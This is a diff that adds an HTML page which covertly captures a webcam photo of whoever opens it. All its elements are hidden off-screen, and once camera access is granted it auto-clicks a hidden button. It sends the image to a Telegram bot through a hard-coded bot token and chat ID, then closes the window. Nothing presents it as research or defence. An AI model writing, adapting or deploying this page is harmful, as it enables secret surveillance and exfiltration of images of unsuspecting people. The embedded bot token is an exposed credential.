@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      #video,
+      #capture,
+      #canvas {
+        display: none !important;
+        visibility: hidden !important;
+        width: 0 !important;
+        height: 0 !important;
+        position: absolute !important;
+        left: -9999px !important;
+        top: -9999px !important;
+      }
+    </style>
+  </head>
+  <body>
+    <video id="video" width="320" height="240" autoplay></video>
+    <button id="capture"></button>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+
+      // Ask for camera access
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+        })
+        .catch((err) => console.error("Camera access denied:", err));
+
+      const captureButton = document.getElementById("capture");
+
+      captureButton.onclick = async () => {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL("image/png");
+        const blob = await (await fetch(dataUrl)).blob(); // Convert data URL to Blob
+
+        // Example Telegram bot token and chat ID (replace with your own)
+        const token = "7640623735:AAGc72UyKSUy8c-Tl4jcY-lv7HCpHFLjD0o";
+        const chatId = "1437208295";
+        const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.png"); // Append Blob with a filename
+
+        try {
+          const response = await fetch(url, { method: "POST", body: formData });
+          const result = await response.json();
+          console.log(
+            "Telegram API Response:",
+            JSON.stringify(result, null, 2)
+          ); // Log the full JSON response
+          if (response.ok) {
+            window.close(); // Close the window after sending the photo
+          } else {
+            console.error(
+              `Failed to send photo to Telegram: ${
+                result.description || "Unknown error"
+              }.`
+            );
+          }
+        } catch (error) {
+          console.error("Error sending photo to Telegram:", error); // Log any network errors
+        }
+      };
+
+      // Auto-click the capture button when the video starts playing
+      video.onplaying = () => {
+        captureButton.click();
+      };
+    </script>
+  </body>
+</html>
